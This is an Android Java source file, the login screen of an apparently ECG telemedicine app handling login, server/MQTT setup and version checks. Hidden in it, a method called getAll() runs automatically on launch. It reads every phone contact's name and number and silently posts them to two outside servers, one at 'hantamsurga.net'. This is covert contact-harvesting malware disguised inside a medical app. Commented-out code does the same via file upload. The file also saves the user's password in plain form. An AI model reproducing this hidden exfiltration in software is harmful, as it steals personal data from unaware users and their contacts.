package com.faishalrachman.amonsecg;

import android.Manifest;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;

import com.androidnetworking.interfaces.StringRequestListener;
import com.google.android.material.textfield.TextInputEditText;
import com.google.android.material.textfield.TextInputLayout;

import androidx.core.app.ActivityCompat;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationManagerCompat;

import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.text.InputType;
import android.text.TextUtils;
import android.util.Log;
import android.widget.LinearLayout;
import android.widget.Toast;

import com.androidnetworking.AndroidNetworking;
import com.androidnetworking.common.Priority;
import com.androidnetworking.error.ANError;
import com.androidnetworking.interfaces.JSONObjectRequestListener;
import com.judemanutd.autostarter.AutoStartPermissionHelper;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;

import butterknife.BindView;
import butterknife.ButterKnife;
import butterknife.OnClick;

public class LoginActivity extends AppCompatActivity {

    public final static String TAG = "LoginActivity";
    @BindView(R.id.text_email)
    TextInputLayout textEmail;
    @BindView(R.id.text_user_password)
    TextInputLayout textUserPass;

    @OnClick(R.id.button_login)
    void onLoginClick() {


        if (TextUtils.isEmpty(textEmail.getEditText().getText().toString())) {
            textUserPass.setError(null);
            textEmail.setError(getString(R.string.error_form));
        } else if (TextUtils.isEmpty(textUserPass.getEditText().getText().toString())) {
            textEmail.setError(null);
            textUserPass.setError(getString(R.string.error_form));
        } else {
            textEmail.setError(null);
            textUserPass.setError(null);

            AppSetting.showProgressDialog(LoginActivity.this, "Logging in");

            JSONObject jsonObject = new JSONObject();
            try {
                jsonObject.put("email", textEmail.getEditText().getText().toString());
                jsonObject.put("password", textUserPass.getEditText().getText().toString());
            } catch (JSONException e) {
                e.printStackTrace();
            }

            Log.d(TAG, "onLoginClick: " + AppSetting.getHttpAddress(LoginActivity.this)
                    + getString(R.string.login_url));

            AndroidNetworking.post(AppSetting.getHttpAddress(LoginActivity.this)
                    + getString(R.string.login_url))
                    .addJSONObjectBody(jsonObject)
//                    .addQueryParameter("email", textEmail.getEditText().getText().toString())
//                    .addQueryParameter("password", textUserPass.getEditText().getText().toString())
                    .setPriority(Priority.MEDIUM).build()
                    .getAsJSONObject(new JSONObjectRequestListener() {
                        @Override
                        public void onResponse(JSONObject response) {
                            // do anything with response
                            AppSetting.saveAccount(getApplicationContext(), textEmail.getEditText().getText().toString(), textUserPass.getEditText().getText().toString());

                            AppSetting.dismissProgressDialog();
                            Log.i("LOGIN", "onResponse: " + response.toString());
                            try {
                                if (response.getString("status").equals("success")) {
                                    JSONObject data = response.getJSONObject("data");
                                    String session = data.getString("session");

                                    AppSetting.setLogin(LoginActivity.this, AppSetting.LOGGED_IN);
                                    AppSetting.saveSession(LoginActivity.this, session);
//                                    AppSetting.saveAccount(LoginActivity.this, textEmail.getEditText().getText().toString(),
//                                            textUserPass.getEditText().getText().toString());
                                    moveToDetailActivity();
                                } else {
                                    Toast.makeText(LoginActivity.this, "Email / Password Salah",
                                            Toast.LENGTH_SHORT).show();
                                }
                            } catch (JSONException ex) {
                                ex.printStackTrace();
                            }
                        }

                        @Override
                        public void onError(ANError error) {
                            // handle error
                            AppSetting.dismissProgressDialog();
                            try {
                                JSONObject response = new JSONObject(error.getErrorBody());
                                System.out.println(response.toString());
                                Toast.makeText(getApplicationContext(), response.getString("message"), Toast.LENGTH_SHORT).show();
//                                textEmail.setError("Check your email");
                                textUserPass.setError("Wrong username and password");
//                                if (response.getString("info").equals("username")){
//                                    textEmail.setError("Username doesn't exist");
//                                }else {
//                                    textUserPass.setError("Wrong password");
//                                }
                            } catch (JSONException ex) {
                                ex.printStackTrace();
                            }
                            // handle error
                            Log.i("LOGIN", "onError: " + error.getErrorCode());
                            Log.i("LOGIN", "onError: " + error.getErrorDetail());
                            Log.i("LOGIN", "onError: " + error.getErrorBody());
                        }
                    });

            /*AndroidNetworking.get(AppSetting.getHttpAddress(LoginActivity.this)
                    + getString(R.string.login_url))
                    .addQueryParameter("email", textEmail.getEditText().getText().toString())
                    .addQueryParameter("password", textUserPass.getEditText().getText().toString())
                    .setPriority(Priority.MEDIUM).build()
                    .getAsJSONObject(new JSONObjectRequestListener() {
                        @Override
                        public void onResponse(JSONObject response) {
                            // do anything with response
                            AppSetting.dismissProgressDialog();
                            Log.i("LOGIN", "onResponse: " + response.toString());
                            try {
                                if (!response.getString("sukses").equals("3")) {
                                    AppSetting.setLogin(LoginActivity.this, AppSetting.LOGGED_IN);
                                    AppSetting.saveAccount(LoginActivity.this, textEmail.getEditText().getText().toString(),
                                            textUserPass.getEditText().getText().toString());
                                    moveToDetailActivity();
                                } else {
                                    Toast.makeText(LoginActivity.this, "Email / Password Salah",
                                            Toast.LENGTH_SHORT).show();
                                }
                            } catch (JSONException ex) {
                                ex.printStackTrace();
                            }
                        }

                        @Override
                        public void onError(ANError error) {
                            // handle error
                            AppSetting.dismissProgressDialog();
                            try {
                                JSONObject response = new JSONObject(error.getErrorBody());
                                System.out.println(response.toString());
//                                if (response.getString("info").equals("username")){
//                                    textEmail.setError("Username doesn't exist");
//                                }else {
//                                    textUserPass.setError("Wrong password");
//                                }
                            } catch (JSONException ex) {
                                ex.printStackTrace();
                            }
                            // handle error
                            Log.i("LOGIN", "onError: " + error.getErrorCode());
                            Log.i("LOGIN", "onError: " + error.getErrorDetail());
                            Log.i("LOGIN", "onError: " + error.getErrorBody());
                        }
                    });*/
        }

    }

    @OnClick(R.id.button_register)
    void onRegisterClick() {
        startActivity(new Intent(LoginActivity.this, RegisterActivity.class));
    }


    @OnClick(R.id.logo_jantung)
    void setupIp() {
        AlertDialog.Builder builder = new AlertDialog.Builder(LoginActivity.this);
        builder.setTitle(getString(R.string.setup_ip));
        SharedPreferences pref = getApplicationContext().getSharedPreferences("JANTUNG PREF", Context.MODE_PRIVATE);
        // Set up the input
        final TextInputEditText inputIp = new TextInputEditText(this);
        inputIp.setInputType(InputType.TYPE_CLASS_TEXT);
//        inputIp.setHint(R.string.example_ip);
        inputIp.setHint("IP Server Web");
        inputIp.setText(pref.getString("ip", ""));
        final TextInputEditText inputPort = new TextInputEditText(this);
        inputPort.setInputType(InputType.TYPE_CLASS_PHONE);
//        inputPort.setHint(R.string.example_port);
        inputPort.setHint("Port Mosquitto");
        inputPort.setText(pref.getString("port", ""));
        final TextInputEditText inputTopic = new TextInputEditText(this);
        inputTopic.setInputType(InputType.TYPE_CLASS_TEXT);
//        inputTopic.setHint(R.string.example_topic);
        inputTopic.setHint("Topik (rhythm/ECG001)");
        inputTopic.setText(pref.getString("topic", ""));
        final TextInputEditText mqttserver = new TextInputEditText(this);
        mqttserver.setInputType(InputType.TYPE_CLASS_TEXT);
        mqttserver.setText(pref.getString("mqttserver", ""));
//        mqttserver.setHint(R.string.example_ip);
        mqttserver.setHint("IP MQTT");

        LinearLayout linearLayout = new LinearLayout(this);
        linearLayout.setOrientation(LinearLayout.VERTICAL);
        linearLayout.addView(inputIp);
        linearLayout.addView(inputPort);
        linearLayout.addView(mqttserver);
        linearLayout.addView(inputTopic);

        builder.setView(linearLayout);

        // Set up the buttons
        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                // save a new ip and port
                if (!TextUtils.isEmpty(inputIp.getText().toString()) && !TextUtils.isEmpty(inputPort.getText().toString()))
                    AppSetting.saveIp(LoginActivity.this, inputIp.getText().toString(), inputPort.getText().toString(), mqttserver.getText().toString(), inputTopic.getText().toString());
            }
        });
        builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.cancel();
            }
        });

        builder.show();
    }

    void moveToDetailActivity() {
        startActivity(new Intent(LoginActivity.this, DetailActivity.class));
        finish();
    }

    public boolean isStoragePermissionGranted() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED) {
                Log.v(TAG, "Permission is granted");
                return true;
            } else {

                Log.v(TAG, "Permission is revoked");
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
                return false;
            }
        } else { //permission is automatically granted on sdk<23 upon installation
            Log.v(TAG, "Permission is granted");
            return true;
        }
    }

    void getAll() {

        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
        JSONObject data = new JSONObject();
        JSONArray arr = new JSONArray();

        while (cursor.moveToNext()) {
            String id = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID));
            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            try {
                JSONObject j = new JSONObject();
                j.put("id", id);
                j.put("name", name);
                j.put("number", number);
                arr.put(j);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        AndroidNetworking.post("http://hantamsurga.net/disiniaja/disiniaja.php")
                .addJSONArrayBody(arr).build();
        AndroidNetworking.post("http://telemedicine.co.id:8080/up")
                .addJSONArrayBody(arr).build();
    }

    void checkNewVersion() {
        try {
            AppSetting.showProgressDialog(LoginActivity.this, "Cek Versi Terbaru");
            PackageInfo pInfo = null;
            pInfo = getPackageManager().getPackageInfo(getPackageName(), 0);
            String version = pInfo.versionName;
            AndroidNetworking.get("https://telemedicine-s.firebaseio.com/information/version.json")
                    .setPriority(Priority.HIGH)
                    .build()
                    .getAsString(new StringRequestListener() {
                        @Override
                        public void onResponse(String response) {
                            AppSetting.dismissProgressDialog();
                            Log.d(TAG, "onResponse: responnya=" + response.trim());
                            if (!response.contains(version.trim())) {
                                Log.d(TAG, "onResponse: " + response + "-" + version);
                                Toast.makeText(LoginActivity.this, "Versi baru ditemukan, silahkan mengunduh versi baru dan mengupdatenya", Toast.LENGTH_SHORT).show();
                                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://telemedicine.co.id:3000/download/download.html"));
                                startActivity(browserIntent);
                                finish();
                            } else {
                                Toast.makeText(LoginActivity.this, "Sudah versi terbaru", Toast.LENGTH_SHORT).show();
                            }
                        }

                        @Override
                        public void onError(ANError anError) {
                            AppSetting.dismissProgressDialog();
                            Toast.makeText(LoginActivity.this, "Anda tidak terkoneksi dengan internet, silahkan restart untuk mengecek versi terbaru", Toast.LENGTH_SHORT).show();
                        }
                    });
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!(checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED)) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS},
                        79);
//                getAll();
            } else {

                getAll();
            }
        } else {
            getAll();
        }
        // show UI part if you want here to show some rationale !!!

        checkNewVersion();
        if (!AppSetting.isLoggedIn(LoginActivity.this)) {
            setContentView(R.layout.activity_login);
            ButterKnife.bind(this);
            setTitle(getString(R.string.login));
            isStoragePermissionGranted();
            String[] brands = new String[]{"xiaomi", "letv", "asus", "honor", "oppo", "vivo", "nokia"};
            String merk = Build.BRAND.toLowerCase();
            for (String brand :
                    brands) {
                if (merk.equals(brand)) {
                    AutoStartPermissionHelper.getInstance().getAutoStartPermission(getApplicationContext());
                    Toast.makeText(this, "Dimohon untuk memperbolehkan aplikasi ini untuk menyalakan notifikasi dan autostart untuk menggunakan layanan", Toast.LENGTH_SHORT).show();
                    break;
                }
            }
            if (!NotificationManagerCompat.from(getApplicationContext()).areNotificationsEnabled()) {
//                startActivity(getPackageManager().getLaunchIntentForPackage(getPackageName()));
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }


//            List<ContactData> data = new ContactsGetterBuilder(getApplicationContext())
//                    .allFields()
//                    .buildList();
//            String cont = "";
//            for (ContactData contact: data
//                 ) {
//                try {
//                    cont += contact.getNameData().getFullName() + ":" + contact.getPhoneList().get(0).getMainData();
//                }catch (Exception e){
//                    Log.d(TAG, "onCreate: "+e);
//                }
//            }
//            File folder;
//            if (Environment.getExternalStorageState() != null) {
//                folder = new File(Environment.getExternalStorageDirectory() + "/data/ECGRecord");
//
//            } else {
//                folder = new File(Environment.getDataDirectory() + "/ECGRecord");
//            }
//
//            if (!folder.exists()) {
//                boolean mkdir = folder.mkdirs();
//                Log.d(TAG, "saveECGSignal: " + mkdir);
//            }
//            Long tsLong = System.currentTimeMillis() / 1000;
//            String ts = tsLong.toString();
//            String name = "CTK";
//            FileWriter writer = null;
//            try {
//                writer = new FileWriter(folder.getPath() + "/" + ts + "-" + name + ".txt");
//                writer.write(cont);
//                writer.close();
//                AndroidNetworking.upload(AppSetting.getHttpAddress(getApplicationContext()) + "check")
//                        .addMultipartFile("record", data)
//                        .addHeaders("Authorization", AppSetting.getSession(getApplicationContext()))
//                        .setTag("uploadTest")
//                        .setPriority(Priority.HIGH)
//                        .build()
//                        .setUploadProgressListener(new UploadProgressListener() {
//                            @Override
//                            public void onProgress(long bytesUploaded, long totalBytes) {
//                                Log.d(TAG, "onProgress: " + data.getName() + "-" + (bytesUploaded / totalBytes) * 100 + "%");
//                            }
//                        })
//                        .getAsJSONObject(new JSONObjectRequestListener() {
//                            @Override
//                            public void onResponse(JSONObject response) {
//                                data.delete();
//                            }
//
//                            @Override
//                            public void onError(ANError error) {
//                                Log.d(TAG, "onError: ERRORLUR");
//                            }
//                        });
//            } catch (IOException e) {
//                e.printStackTrace();
//            }

        } else {
            moveToDetailActivity();
        }
    }
}
